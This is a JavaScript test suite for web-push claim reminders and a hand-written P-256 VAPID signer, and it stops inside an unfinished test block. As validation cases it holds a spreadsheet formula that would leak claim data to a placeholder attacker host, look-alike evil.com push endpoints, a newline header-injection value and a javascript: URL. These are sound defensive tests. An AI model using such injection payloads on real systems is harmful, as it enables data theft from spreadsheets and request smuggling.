/* node tests/remind.test.js - the monthly claim reminders in backend/Code.gs (Web Push with a VAPID signature worked out in pure BigInt).
   It checks the elliptic-curve maths against Node's own crypto (public keys, and that Node accepts every signature), the reminder
   action (key / join / leave / status), who is pinged on which day, and the trigger. It cannot prove that Google's, Apple's or
   Mozilla's push services accept the pings: that is only known after the first real run (see README, "Monthly reminders"). */
'use strict';
const assert = require('assert');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { fakeGoogle } = require('./fakegoogle');

const CODE = fs.readFileSync(path.join(__dirname, '..', 'backend', 'Code.gs'), 'utf8');
const say = (s) => console.log('  ok  ' + s);
const N = BigInt('0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551');
const hex = (buf) => Buffer.from(buf).toString('hex');

/* Code.gs in a sandbox with the fake Google, a clock we set, a lock that refuses to be taken twice, and a push service we control */
function boot(startIso) {
  const fake = fakeGoogle();
  const logs = [], clock = { now: Date.parse(startIso || '2026-11-08T01:30:00Z') };
  const sandbox = Object.assign({ console: { log: (...a) => logs.push(a.join(' ')), error: (...a) => logs.push('ERROR ' + a.join(' ')) } }, fake.G);
  vm.createContext(sandbox);
  vm.runInContext(CODE, sandbox, { filename: 'Code.gs' });
  sandbox.Date = class extends Date {
    constructor(...a) { if (a.length) super(...a); else super(clock.now); }
    static now() { return clock.now; }
  };
  const locks = { held: false, taken: 0 };
  sandbox.LockService = { getScriptLock: () => ({
    waitLock() { if (locks.held) throw new Error('the lock was taken twice in one run'); locks.held = true; locks.taken++; },
    releaseLock() { locks.held = false; } }) };
  const pushes = [], push = { reply: () => 201 };
  sandbox.UrlFetchApp = { fetch(url, opts) {
    const rec = { url, opts }; pushes.push(rec);
    const r = push.reply(url, pushes.length, rec);
    if (r instanceof Error) throw r;
    return { getResponseCode: () => r, getContentText: () => '' };
  } };
  const api = {
    async get(q) { return JSON.parse(sandbox.doGet({ parameter: q }).getContent()); },
    async post(b) { return JSON.parse(sandbox.doPost({ parameter: {}, postData: { contents: JSON.stringify(b) } }).getContent()); },
  };
  const remind = (b) => api.post(Object.assign({ action: 'remind' }, b));
  const book = () => fake.sheets.get(fake.props.SHEET_ID);
  const rows = () => {                       // the Reminders sheet below its header, as objects
    if (!fake.props.SHEET_ID) return [];
    const bk = book(), sh = bk.list.find((s) => (s._name || bk.names.get(s)) === 'Reminders');
    if (!sh) return [];
    const cols = ['endpoint', 'name', 'slug', 'email', 'added', 'updated', 'lastSent', 'lastResult'];
    return sh.rows.slice(1).filter((r) => r && r[0]).map((r) => Object.fromEntries(cols.map((c, i) => [c, r[i] === undefined ? '' : r[i]])));
  };
  const sheetNames = () => { if (!fake.props.SHEET_ID) return []; const bk = book(); return bk.list.map((s) => s._name || bk.names.get(s)); };
  return { fake, sandbox, api, remind, logs, clock, locks, pushes, push, rows, sheetNames, at: (iso) => { clock.now = Date.parse(iso); } };
}

const ep = (i, host) => 'https://' + (host || 'fcm.googleapis.com') + '/fcm/send/token' + i + ':APA91b' + 'x'.repeat(30);
const bytes = (arr) => Buffer.from(Array.from(arr));            // a list of byte values made inside the sandbox, as a Node Buffer
const bigOf = (buf) => BigInt('0x' + hex(buf));
const jwkKey = (pub) => crypto.createPublicKey({ key: { kty: 'EC', crv: 'P-256', x: pub.subarray(1, 33).toString('base64url'), y: pub.subarray(33).toString('base64url') }, format: 'jwk' });

/* Authorization header: 'vapid t=<header>.<claims>.<signature>, k=<public key>' - checked with Node, not with our own code */
function checkHeader(header, endpoint, nowSec) {
  const m = /^vapid t=([\w-]+)\.([\w-]+)\.([\w-]+), k=([\w-]+)$/.exec(header);
  assert.ok(m, 'the Authorization header has the shape "vapid t=..., k=...": ' + String(header).slice(0, 40));
  const [, h, c, s, k] = m;
  assert.strictEqual(Buffer.from(h, 'base64url').toString(), '{"typ":"JWT","alg":"ES256"}');
  const claims = JSON.parse(Buffer.from(c, 'base64url').toString());
  assert.deepStrictEqual(Object.keys(claims).sort(), ['aud', 'exp', 'sub']);
  assert.strictEqual(claims.aud, new URL(endpoint).origin, 'aud is the origin of the push service');
  assert.ok(claims.exp > nowSec + 11 * 3600 && claims.exp <= nowSec + 12 * 3600, 'exp is about 12 hours away, within the 24 hours the services allow');
  assert.ok(/^mailto:[^\s@]+@[^\s@]+$/.test(claims.sub), 'sub is a mailto: address');
  const pub = Buffer.from(k, 'base64url'), sig = Buffer.from(s, 'base64url');
  assert.strictEqual(pub.length, 65); assert.strictEqual(pub[0], 4, 'k is the 65-byte uncompressed point');
  assert.strictEqual(sig.length, 64, 'the signature is r || s, 64 bytes');
  assert.ok(crypto.verify('sha256', Buffer.from(h + '.' + c), { key: jwkKey(pub), dsaEncoding: 'ieee-p1363' }, sig), 'Node accepts the signature');
  return { claims, k, pub };
}

(async () => {
  /* ---------- (1) the P-256 arithmetic, against Node ---------- */
  {
    const { sandbox } = boot();
    const pubOf = (d) => bytes(sandbox.p256PublicBytes_(d));
    const nodePub = (d) => { const e = crypto.createECDH('prime256v1'); e.setPrivateKey(Buffer.from(d.toString(16).padStart(64, '0'), 'hex')); return e.getPublicKey(null, 'uncompressed'); };
    const edge = [1n, 2n, 3n, 4n, 5n, 7n, 255n, 256n, 2n ** 128n, 2n ** 255n, N - 1n, N - 2n, N - 3n, N >> 1n, (N >> 1n) + 1n];
    edge.forEach((d) => assert.strictEqual(hex(pubOf(d)), hex(nodePub(d)), 'public key of ' + d.toString(16).slice(0, 12)));
    for (let i = 0; i < 60; i++) {
      const e = crypto.createECDH('prime256v1'); e.generateKeys();
      assert.strictEqual(hex(pubOf(bigOf(e.getPrivateKey()))), hex(e.getPublicKey(null, 'uncompressed')), 'random key ' + i);
    }
    say('P-256: ' + (edge.length + 60) + ' public keys (edge scalars and random ones) are the same as Node\'s');

    // a base point other than G, adding points that are not G, the point at infinity, and doubling through the add formula
    const c = sandbox.p256_();
    const q = sandbox.p256Mul_(7n, c.gx, c.gy);                                  // Q = 7G
    for (const k of [1n, 2n, 5n, 6n, 100n, N - 1n, N - 7n, N - 8n]) {
      const got = sandbox.p256Mul_(k, q.x, q.y);                                 // k * 7G, which is (7k mod n) G
      const want = nodePub((7n * k) % N);
      assert.strictEqual('04' + got.x.toString(16).padStart(64, '0') + got.y.toString(16).padStart(64, '0'), hex(want), 'k * Q for k = ' + k);
    }
    assert.strictEqual(sandbox.p256Mul_(N, c.gx, c.gy), null, 'n * G is the point at infinity');
    const same = sandbox.jAdd_([c.gx, c.gy, c.one], [c.gx, c.gy, c.one]), dbl = sandbox.jDouble_([c.gx, c.gy, c.one]);
    assert.deepStrictEqual([same[0], same[1], same[2]], [dbl[0], dbl[1], dbl[2]], 'P + P goes through doubling');
    assert.strictEqual(sandbox.jAdd_([c.gx, c.gy, c.one], [c.gx, c.p - c.gy, c.one])[2], 0n, 'P + (-P) is the point at infinity');
    assert.strictEqual(sandbox.modInv_(3n, 7n), 5n); assert.strictEqual((sandbox.modInv_(123456789n, c.n) * 123456789n) % c.n, 1n);
    say('P-256: points other than G, n * G = infinity, P + P, P + (-P), modular inverse');

    // bytes and base64url, because the Google calls want signed bytes
    assert.deepStrictEqual(Array.from(sandbox.s8_([0, 127, 128, 255, 200])), [0, 127, -128, -1, -56]);
    assert.deepStrictEqual(Array.from(sandbox.u8_([0, 127, -128, -1, -56])), [0, 127, 128, 255, 200]);
    const rnd = crypto.randomBytes(65);
    assert.strictEqual(sandbox.b64u_(Array.from(rnd)), rnd.toString('base64url'));
    assert.strictEqual(hex(sandbox.b64uBytes_(rnd.toString('base64url'))), hex(rnd));
    say('bytes: signed <-> unsigned, base64url without padding');
  }

  /* ---------- (2) ES256 signatures and the JWT, verified by Node ---------- */
  {
    const t = boot(), { sandbox } = t;
    let worst = 0;
    for (let i = 0; i < 20; i++) {
      const e = crypto.createECDH('prime256v1'); e.generateKeys();
      const d = bigOf(e.getPrivateKey()), msg = crypto.randomBytes(Math.floor(Math.random() * 250));
      const t0 = process.hrtime.bigint();
      const sig = bytes(sandbox.es256Sign_(d, Array.from(msg)));
      worst = Math.max(worst, Number(process.hrtime.bigint() - t0) / 1e6);
      assert.strictEqual(sig.length, 64);
      const r = bigOf(sig.subarray(0, 32)), s = bigOf(sig.subarray(32));
      assert.ok(r > 0n && r < N && s > 0n && s < N, 'r and s are in 1..n-1');
      const key = jwkKey(e.getPublicKey(null, 'uncompressed'));
      assert.ok(crypto.verify('sha256', msg, { key, dsaEncoding: 'ieee-p1363' }, sig), 'Node verifies signature ' + i);
      const bad = Buffer.from(msg.length ? msg : [1]); bad[0] ^= 1;
      assert.ok(!crypto.verify('sha256', bad, { key, dsaEncoding: 'ieee-p1363' }, sig), 'a changed message does not verify');
      assert.strictEqual(hex(bytes(sandbox.es256Sign_(d, Array.from(msg)))), hex(sig), 'the same message gets the same signature (k is not random)');
    }
    assert.ok(worst < 1000, 'one signature must take well under a second (worst ' + worst.toFixed(0) + ' ms)');
    say('ES256: 20 random keys and messages verify with Node (slowest signature ' + worst.toFixed(0) + ' ms)');

    // the whole Authorization header, with a private key we choose (public key derived by the script)
    const endpoints = [ep(1), 'https://updates.push.services.mozilla.com/wpush/v2/gAAAAAB' + 'y'.repeat(60), 'https://web.push.apple.com/Q' + 'z'.repeat(40), 'https://wns2-par02p.notify.windows.com/w/?token=BQYAAAB'];
    for (let i = 0; i < 20; i++) {
      const e = crypto.createECDH('prime256v1'); e.generateKeys();
      t.fake.props.VAPID_PRIVATE = e.getPrivateKey().toString('base64url');
      if (e.getPrivateKey().length !== 32) continue;                              // (a 31-byte scalar is a 1 in 256 chance: skip that one)
      delete t.fake.props.VAPID_PUBLIC;
      const endpoint = endpoints[i % endpoints.length], nowSec = 1790000000 + i * 977;
      const h = checkHeader(sandbox.buildVapidHeader_(endpoint, nowSec), endpoint, nowSec);
      assert.strictEqual(h.k, e.getPublicKey(null, 'uncompressed').toString('base64url'), 'k is the public key of the stored private key');
      assert.strictEqual(t.fake.props.VAPID_PUBLIC, h.k, 'a lost public key is worked out again, the private key is kept');
    }
    say('JWT: header, claims (aud = origin, exp = 12 h, sub = mailto:) and signature verify with Node for 20 keys and 4 push services');

    // the subject: a fixed address unless a good one is set; the cache gives the same header for the same push service
    t.fake.props.VAPID_SUBJECT = 'mailto:boss@wfc.example';
    assert.strictEqual(checkHeader(sandbox.buildVapidHeader_(ep(1), 1790000000), ep(1), 1790000000).claims.sub, 'mailto:boss@wfc.example');
    t.fake.props.VAPID_SUBJECT = 'javascript:alert(1)';
    assert.strictEqual(checkHeader(sandbox.buildVapidHeader_(ep(1), 1790000000), ep(1), 1790000000).claims.sub, 'mailto:marketing.wfcsystems@gmail.com');
    delete t.fake.props.VAPID_SUBJECT;
    const cache = {}, h1 = sandbox.buildVapidHeader_(ep(1), 1790000000, cache), h2 = sandbox.buildVapidHeader_(ep(2), 1790000050, cache);
    assert.strictEqual(h1, h2, 'two addresses on the same push service share one header within a run');
    assert.notStrictEqual(h1, sandbox.buildVapidHeader_(ep(1, 'updates.push.services.mozilla.com'), 1790000000, cache), 'another push service gets its own');
    assert.throws(() => sandbox.buildVapidHeader_('http://fcm.googleapis.com/x', 1), /https/);
    say('JWT: subject from a script property (checked), one header per push service in a run, no http');
  }

  /* ---------- (3) the remind action ---------- */
  {
    const t = boot(), { fake, api, remind } = t;
    const bad = (r, what) => { assert.strictEqual(r.ok, false, what + ' should be refused, got ' + JSON.stringify(r).slice(0, 120)); assert.strictEqual(r.code, 400, what + ': code'); return r; };

    // routing: POST only, unknown and missing ops
    assert.strictEqual((await api.get({ action: 'remind', op: 'key' })).ok, false, 'GET is refused');
    assert.strictEqual((await api.get({ action: 'remind', op: 'key' })).error, 'Unknown action.');
    assert.strictEqual(bad(await remind({ op: 'nope' }), 'an unknown op').error, 'Unknown reminder request.');
    assert.strictEqual(bad(await remind({}), 'no op').error, 'Unknown reminder request.');
    assert.strictEqual(bad(await remind({ op: 'KEY' }), 'an op in capitals').error, 'Unknown reminder request.');
    assert.strictEqual(bad(await remind({ op: { toString: 1 } }), 'an op that is an object').error, 'Unknown reminder request.');
    assert.deepStrictEqual(Object.keys(JSON.parse(JSON.stringify(await api.get({ action: 'ping' })))).includes('remind'), true);
    say('routing: POST only, unknown or missing op -> "Unknown reminder request."');

    // the key: made on first use, the same afterwards, a real P-256 point, tied to the private key in the script properties
    assert.ok(!fake.props.VAPID_PRIVATE && !fake.props.VAPID_PUBLIC, 'no key before anyone asks');
    const k1 = await remind({ op: 'key' });
    assert.deepStrictEqual(Object.keys(k1).sort(), ['key', 'ok']); assert.strictEqual(k1.ok, true);
    assert.ok(/^[\w-]{87}$/.test(k1.key), 'base64url of 65 bytes, no padding');
    const pub = Buffer.from(k1.key, 'base64url');
    assert.strictEqual(pub[0], 4);
    const e = crypto.createECDH('prime256v1'); e.setPrivateKey(Buffer.from(fake.props.VAPID_PRIVATE, 'base64url'));
    assert.strictEqual(hex(e.getPublicKey(null, 'uncompressed')), hex(pub), 'the public key belongs to the stored private key');
    e.computeSecret(pub);                                                       // throws if the point is not on the curve
    for (let i = 0; i < 4; i++) assert.strictEqual((await remind({ op: 'key' })).key, k1.key, 'the key is the same every time');
    assert.strictEqual(fake.props.VAPID_PUBLIC, k1.key);
    const priv = fake.props.VAPID_PRIVATE;
    delete fake.props.VAPID_PUBLIC;
    assert.strictEqual((await remind({ op: 'key' })).key, k1.key, 'a lost public key comes back from the private one');
    assert.strictEqual(fake.props.VAPID_PRIVATE, priv);
    fake.props.DASH_KEY = 'a password';
    assert.strictEqual((await remind({ op: 'key' })).key, k1.key, 'no dashboard password is needed (staff do not have it)');
    assert.strictEqual((await remind({ op: 'join', endpoint: ep(1), name: 'Ali' })).ok, true, 'nor to join');
    delete fake.props.DASH_KEY;
    assert.strictEqual(t.sheetNames().includes('Reminders'), true);
    const other = boot(); const k2 = await other.remind({ op: 'key' });
    assert.notStrictEqual(k2.key, k1.key, 'another script makes its own key');
    assert.ok(!t.logs.concat(other.logs).join('\n').includes(priv), 'the private key is never logged');
    say('key: made on first use, stable across calls, on the curve, matches the stored private key, no password needed');

    // joining: what is refused
    const fresh = boot(), f = fresh.remind;
    const join = (over) => f(Object.assign({ op: 'join', endpoint: ep(1), name: 'Chin Zhi Liang' }, over));
    for (const [what, endpoint] of [
      ['a host that is not a push service', 'https://evil.example.com/fcm/send/x'],
      ['a look-alike host (suffix of another domain)', 'https://fcm.googleapis.com.evil.com/x'],
      ['a look-alike host (no dot before the name)', 'https://evilfcm.googleapis.com/x'],
      ['a name with the host in the user part', 'https://fcm.googleapis.com@evil.com/x'],
      ['http', 'http://fcm.googleapis.com/fcm/send/x'],
      ['another port', 'https://fcm.googleapis.com:8443/x'],
      ['a leading space', ' https://fcm.googleapis.com/fcm/send/x'],
      ['a space inside', 'https://fcm.googleapis.com/fcm/send/x y'],
      ['a new line', 'https://fcm.googleapis.com/fcm/send/x\nTTL: 1'],
      ['ftp', 'ftp://fcm.googleapis.com/x'],
      ['a number', 12], ['an object', { a: 1 }], ['null', null], ['an empty string', ''], ['nothing', undefined],
      ['1001 characters', 'https://fcm.googleapis.com/' + 'a'.repeat(1001 - 27)],
    ]) {
      const r = bad(await join({ endpoint }), what);
      assert.ok(/cannot be used/.test(r.error), what + ': ' + r.error);
    }
    assert.strictEqual(bad(await join({ name: '' }), 'an empty name').error, 'The name is missing.');
    assert.strictEqual(bad(await join({ name: '   \n ' }), 'a blank name').error, 'The name is missing.');
    assert.strictEqual(bad(await join({ name: undefined }), 'no name').error, 'The name is missing.');
    assert.strictEqual(bad(await join({ name: '=+-@' }), 'a name that is only formula signs').error, 'The name is missing.');
    assert.deepStrictEqual(fresh.rows(), [], 'nothing was saved by any of those');
    assert.deepStrictEqual(fresh.sheetNames(), [], 'a refused join does not even make the spreadsheet');
    say('join: refused for a bad host, look-alikes, http, other ports, spaces, 1001 characters, non-text, no name');

    // joining: what is accepted
    for (const endpoint of [ep(1), 'https://updates.push.services.mozilla.com/wpush/v2/gAAAA', 'https://web.push.apple.com/QAbc', 'https://api.push.apple.com/3/device/abc',
      'https://wns2-par02p.notify.windows.com/w/?token=BQYAAAB', 'https://FCM.GoogleAPIs.com/fcm/send/up', 'https://fcm.googleapis.com:443/fcm/send/p', 'https://fcm.googleapis.com/' + 'a'.repeat(1000 - 27)]) {
      assert.deepStrictEqual(await join({ endpoint }), { ok: true }, endpoint.slice(0, 50));
    }
    assert.strictEqual(fresh.rows().length, 8);
    say('join: Google, Mozilla, Apple (both hosts), Windows, upper case, :443 and exactly 1000 characters are accepted, answer is {ok:true}');

    // join -> status -> leave, and joining again updates the same row
    const g = boot(), r = g.remind;
    const A = ep('A'), B = ep('B');
    assert.deepStrictEqual(await r({ op: 'status', endpoint: A }), { ok: true, on: false }, 'status before anything exists (no sheet yet)');
    assert.ok(!g.sheetNames().includes('Reminders'), 'asking for the status does not make the Reminders sheet');
    g.at('2026-11-02T01:00:00Z');
    assert.deepStrictEqual(await r({ op: 'join', endpoint: A, name: '  Chin   Zhi Liang ', email: 'chin@wfc.example', tz: 'Asia/Kuala_Lumpur' }), { ok: true });
    assert.deepStrictEqual(await r({ op: 'status', endpoint: A }), { ok: true, on: true });
    assert.deepStrictEqual(await r({ op: 'status', endpoint: B }), { ok: true, on: false });
    assert.deepStrictEqual(await r({ op: 'status' }), { ok: true, on: false });
    assert.deepStrictEqual(await r({ op: 'status', endpoint: 5 }), { ok: true, on: false });
    let row = g.rows()[0];
    assert.deepStrictEqual([row.endpoint, row.name, row.slug, row.email, row.lastSent, row.lastResult], [A, 'Chin   Zhi Liang', 'chin-zhi-liang', 'chin@wfc.example', '', '']);
    assert.strictEqual(row.added, '2026-11-02T01:00:00.000Z'); assert.strictEqual(row.updated, row.added);
    assert.deepStrictEqual(g.sheetNames(), ['Claims', 'Reminders'], 'the Reminders sheet is made on first use, beside Claims');
    g.at('2026-11-03T05:00:00Z');
    assert.deepStrictEqual(await r({ op: 'join', endpoint: A, name: 'Chin Z L', email: 'not an email' }), { ok: true });
    assert.strictEqual(g.rows().length, 1, 'the same address twice is one row');
    row = g.rows()[0];
    assert.deepStrictEqual([row.name, row.slug, row.email, row.added, row.updated], ['Chin Z L', 'chin-z-l', '', '2026-11-02T01:00:00.000Z', '2026-11-03T05:00:00.000Z'], 'joining again updates the name, keeps the first date');
    await r({ op: 'join', endpoint: B, name: 'Bala' });
    assert.strictEqual(g.rows().length, 2);
    assert.deepStrictEqual(await r({ op: 'leave', endpoint: A }), { ok: true });
    assert.deepStrictEqual(await r({ op: 'status', endpoint: A }), { ok: true, on: false });
    assert.deepStrictEqual(await r({ op: 'status', endpoint: B }), { ok: true, on: true }, 'the other one is still on');
    assert.deepStrictEqual(g.rows().map((x) => x.name), ['Bala']);
    assert.deepStrictEqual(await r({ op: 'leave', endpoint: A }), { ok: true }, 'leaving twice is fine');
    assert.deepStrictEqual(await r({ op: 'leave', endpoint: 'https://fcm.googleapis.com/never' }), { ok: true });
    assert.deepStrictEqual(await r({ op: 'leave' }), { ok: true });
    assert.deepStrictEqual(await r({ op: 'leave', endpoint: B }), { ok: true });
    assert.deepStrictEqual(g.rows(), []);
    const g2 = boot();
    assert.deepStrictEqual(await g2.remind({ op: 'leave', endpoint: A }), { ok: true }, 'leaving when there is no list at all');
    say('join / status / leave: upsert by address, leave is ok even when absent, the sheet appears on first join only');

    // names that would be read as a formula in a sheet, long names, control characters
    const h = boot();
    await h.remind({ op: 'join', endpoint: ep(1), name: '=IMAGE("https://evil.example/"&Claims!G2)' });
    await h.remind({ op: 'join', endpoint: ep(2), name: '+60 12 Ali', email: '=cmd@x.my' });
    await h.remind({ op: 'join', endpoint: ep(3), name: 'N'.repeat(200) });
    await h.remind({ op: 'join', endpoint: ep(4), name: 'Ng\u0000\u001f Wei\tHan' });
    const rs = h.rows();
    assert.ok(!/^[=+\-@]/.test(rs[0].name) && !/^[=+\-@]/.test(rs[1].name) && !/^[=+\-@]/.test(rs[1].email), 'a name or an email never starts a formula');
    assert.strictEqual(rs[1].slug, h.sandbox.slug_('+60 12 Ali'), 'the slug is the same as the claim would get');
    assert.strictEqual(rs[2].name.length, 80, 'a long name is cut at 80, like a claimant on a claim');
    assert.strictEqual(rs[3].name, 'Ng  Wei Han');
    say('join: no leading formula signs in the sheet, names cut at 80 characters, control characters dropped');

    // the 300 limit
    const m = boot();
    for (let i = 1; i <= 300; i++) assert.deepStrictEqual(await m.remind({ op: 'join', endpoint: ep(i), name: 'Person ' + i }), { ok: true }, 'subscriber ' + i);
    assert.strictEqual(m.rows().length, 300);
    const over = bad(await m.remind({ op: 'join', endpoint: ep(301), name: 'One too many' }), 'the 301st');
    assert.ok(/too many/i.test(over.error), over.error);
    assert.strictEqual(m.rows().length, 300);
    assert.deepStrictEqual(await m.remind({ op: 'join', endpoint: ep(150), name: 'Person 150 again' }), { ok: true }, 'someone already on the list can still update at 300');
    assert.strictEqual(m.rows()[149].name, 'Person 150 again');
    await m.remind({ op: 'leave', endpoint: ep(7) });
    assert.deepStrictEqual(await m.remind({ op: 'join', endpoint: ep(301), name: 'One more' }), { ok: true }, 'room again after someone leaves');
    assert.strictEqual(m.rows().length, 300);
    say('limit: 300 subscribers, the 301st is refused, an update at 300 and a join after a leave are fine');

    // locks: joins and leaves take the lock once, never twice inside each other; reads and key lookups do not
    const l = boot(); await l.remind({ op: 'key' });
    const afterKey = l.locks.taken;
    await l.remind({ op: 'key' }); await l.remind({ op: 'status', endpoint: ep(1) });
    assert.strictEqual(l.locks.taken, afterKey, 'the second key lookup and status do not lock');
    await l.remind({ op: 'join', endpoint: ep(1), name: 'Ali' }); assert.strictEqual(l.locks.taken, afterKey + 1);
    await l.remind({ op: 'leave', endpoint: ep(1) }); assert.strictEqual(l.locks.taken, afterKey + 2);
    assert.strictEqual(l.locks.held, false, 'the lock is let go');
    say('locking: join and leave lock once each (never nested), key and status do not');
  }

  /* ---------- (4) sending ---------- */
  {
    // a claim for `month`, sent (published) or only started (pending)
    const claim = async (t, name, month, finish) => {
      const sub = await t.api.post({ action: 'submit', claim: { claimant: name, month, lines: [{ category: 'Parking', date: month + '-03', name: 'Mall', receiptNo: 'R' + month, amount: 5 }] } });
      assert.strictEqual(sub.ok, true, JSON.stringify(sub));
      if (finish) assert.strictEqual((await t.api.post({ action: 'finish', id: sub.id, token: sub.token })).ok, true);
      return sub.id;
    };
    const people = [['Ali bin Abu', 1], ['Bala', 2], ['Chin Zhi Liang', 3], ['Dewi', 4], ['Emma', 5], ['Faiz', 6]];
    const setup = async (startIso) => {
      const t = boot(startIso);
      for (const [name, i] of people) await t.remind({ op: 'join', endpoint: ep(i), name: name === 'Ali bin Abu' ? 'ali  BIN  abu' : name, email: name === 'Emma' ? 'ali@wfc.example' : '' });
      return t;
    };
    const sentTo = (t) => t.pushes.map((p) => p.url);

    // days 1, 8, 13 and 15 send, any other day does not
    for (const day of [1, 8, 13, 15]) {
      const t = await setup('2026-11-' + String(day).padStart(2, '0') + 'T01:30:00Z');
      await claim(t, 'Ali bin Abu', '2026-10', true);
      const summary = t.sandbox.remindDaily();
      assert.strictEqual(summary.month, '2026-10'); assert.strictEqual(summary.day, day);
      assert.strictEqual(t.pushes.length, 5, 'day ' + day + ': everybody but Ali, who has claimed');
      assert.ok(!sentTo(t).includes(ep(1)));
    }
    for (const day of [2, 7, 9, 12, 14, 16, 20, 28, 30]) {
      const t = await setup('2026-11-' + String(day).padStart(2, '0') + 'T01:30:00Z');
      const before = t.rows();
      const summary = t.sandbox.remindDaily();
      assert.strictEqual(t.pushes.length, 0, 'day ' + day + ' sends nothing');
      assert.strictEqual(summary.due, 0); assert.deepStrictEqual(t.rows(), before, 'and changes nothing');
    }
    assert.strictEqual((await setup('2026-12-31T01:30:00Z')).sandbox.remindDaily().sent, 0, '31 December is not a reminder day');
    say('days: 1, 8, 13 and 15 send (and skip whoever has claimed); 2, 7, 9, 12, 14, 16, 20, 28, 30 and 31 send nothing');

    // what each ping looks like
    {
      const t = await setup('2026-11-08T01:30:00Z');
      const key = (await t.remind({ op: 'key' })).key;
      t.sandbox.remindDaily();
      assert.strictEqual(t.pushes.length, 6, 'nobody has claimed: everyone');
      const nowSec = Math.floor(t.clock.now / 1000);
      t.pushes.forEach((p, i) => {
        assert.strictEqual(p.url, ep(i + 1), 'sent to the subscriber\'s own address');
        assert.strictEqual(p.opts.method, 'post');
        assert.ok(p.opts.payload == null || p.opts.payload === '', 'the body is empty (nothing to encrypt)');
        assert.ok(!('contentType' in p.opts));
        assert.strictEqual(p.opts.headers.TTL, '86400'); assert.strictEqual(p.opts.headers.Urgency, 'normal');
        assert.deepStrictEqual(Object.keys(p.opts.headers).sort(), ['Authorization', 'TTL', 'Urgency']);
        assert.strictEqual(p.opts.muteHttpExceptions, true, 'a 404 or 410 is an answer to read, not an error');
        const h = checkHeader(p.opts.headers.Authorization, p.url, nowSec);
        assert.strictEqual(h.k, key, 'k is the key the phones subscribed with');
      });
      const rows = t.rows();
      assert.ok(rows.every((r) => r.lastSent === '2026-11-08T01:30:00.000Z' && r.lastResult === 201), 'lastSent and lastResult are written for each');
      say('ping: POST to the subscriber\'s address, no body, TTL 86400, Urgency normal, a VAPID header Node verifies, aud = origin, lastSent/lastResult saved');

      // different push services: each gets an aud of its own
      const u = boot('2026-11-15T01:30:00Z');
      const eps = ['https://fcm.googleapis.com/fcm/send/a', 'https://updates.push.services.mozilla.com/wpush/v2/b', 'https://web.push.apple.com/Qc', 'https://wns2-par02p.notify.windows.com/w/?token=d', 'https://fcm.googleapis.com/fcm/send/e'];
      for (let i = 0; i < eps.length; i++) await u.remind({ op: 'join', endpoint: eps[i], name: 'Person ' + i });
      u.sandbox.remindDaily();
      u.pushes.forEach((p, i) => checkHeader(p.opts.headers.Authorization, eps[i], Math.floor(u.clock.now / 1000)));
      assert.deepStrictEqual(u.pushes.map((p) => p.url), eps);
      say('ping: Google, Mozilla, Apple and Windows addresses each get a header with their own aud');
    }

    // who counts as "has claimed": a sent claim and one being sent do; only for last month; matched by the name's slug and nothing else
    {
      const t = await setup('2026-11-13T01:30:00Z');
      await claim(t, 'Ali bin Abu', '2026-10', true);              // sent -> skipped (the subscriber typed the name differently: same slug)
      await claim(t, 'Bala', '2026-10', false);                    // still uploading (pending) -> skipped
      await claim(t, 'Chin Zhi Liang', '2026-09', true);           // a claim for another month -> still reminded
      await claim(t, 'Dewi', '2026-11', true);                     // this month's claim is not last month's -> still reminded
      await claim(t, 'Faiz Rahman', '2026-10', true);              // a different name (the slug differs) -> Faiz is still reminded
      // Emma's email is Ali's, but people are not matched by email
      const s = t.sandbox.remindDaily();
      assert.deepStrictEqual(sentTo(t), [ep(3), ep(4), ep(5), ep(6)], 'Chin, Dewi, Emma and Faiz are reminded; Ali and Bala are not');
      assert.strictEqual(s.subscribers, 6); assert.strictEqual(s.due, 4); assert.strictEqual(s.sent, 4); assert.strictEqual(s.ok, 4);
      const byName = Object.fromEntries(t.rows().map((r) => [r.name, r]));
      assert.strictEqual(byName.Bala.lastSent, '', 'no ping, no lastSent'); assert.strictEqual(byName.Bala.lastResult, ''); assert.strictEqual(byName['Chin Zhi Liang'].lastResult, 201);
      say('claimed or not: sent and half-sent claims skip the ping; other months, other names and the same email do not; matched by slug_(name) only');

      // a claim that is sent afterwards is honoured on the next reminder day
      await claim(t, 'Chin Zhi Liang', '2026-10', true);
      t.pushes.length = 0; t.at('2026-11-15T01:30:00Z');
      t.sandbox.remindDaily();
      assert.deepStrictEqual(sentTo(t), [ep(4), ep(5), ep(6)], 'two days later Chin has claimed and is left alone');
      say('claimed or not: someone who claims between two reminder days is not pinged on the next');
    }

    // the month rolls over: January targets December of the year before
    {
      const t = await setup('2027-01-01T01:00:00Z');
      await claim(t, 'Ali bin Abu', '2026-12', true);
      await claim(t, 'Bala', '2026-11', true);                      // November does not stop December's reminder
      await claim(t, 'Chin Zhi Liang', '2027-12', true);            // nor does some other year
      const s = t.sandbox.remindDaily();
      assert.strictEqual(s.month, '2026-12');
      assert.deepStrictEqual(sentTo(t), [ep(2), ep(3), ep(4), ep(5), ep(6)], 'only Ali (claimed December) is skipped');
      for (const [parts, want] of [[{ y: 2027, m: 1 }, '2026-12'], [{ y: 2026, m: 11 }, '2026-10'], [{ y: 2026, m: 3 }, '2026-02'], [{ y: 2026, m: 12 }, '2026-11'], [{ y: 2026, m: 2 }, '2026-01'], [{ y: 2030, m: 1 }, '2029-12']]) {
        assert.strictEqual(t.sandbox.targetMonth_(parts), want, JSON.stringify(parts));
      }
      for (let d = 1; d <= 31; d++) assert.strictEqual(t.sandbox.shouldRemind_(d), [1, 8, 13, 15].includes(d), 'shouldRemind_(' + d + ')');
      say('month: 1 January reminds for December of the year before; February, March and the rest are one month back');
    }

    // Malaysia's date, not the server's: 01:00 on the 8th in Kuala Lumpur is still the 7th in UTC
    {
      const early = await setup('2026-11-07T17:00:00Z'), late = await setup('2026-11-08T16:30:00Z'), newYear = await setup('2026-12-31T16:30:00Z');
      early.sandbox.remindDaily(); late.sandbox.remindDaily(); newYear.sandbox.remindDaily();
      assert.strictEqual(early.pushes.length, 6, '01:00 on the 8th in Kuala Lumpur (the 7th in UTC) sends');
      assert.strictEqual(late.pushes.length, 0, '00:30 on the 9th in Kuala Lumpur (the 8th in UTC) does not');
      assert.strictEqual(newYear.pushes.length, 6, '00:30 on 1 January in Kuala Lumpur (still 31 December in UTC) sends');
      assert.deepStrictEqual(JSON.parse(JSON.stringify(newYear.sandbox.remindParts_(new Date(Date.parse('2026-12-31T16:30:00Z'))))), { y: 2027, m: 1, d: 1 });
      say('time zone: the day and month are Kuala Lumpur\'s');
    }

    // nobody on the list: nothing sent, nothing made, no error
    {
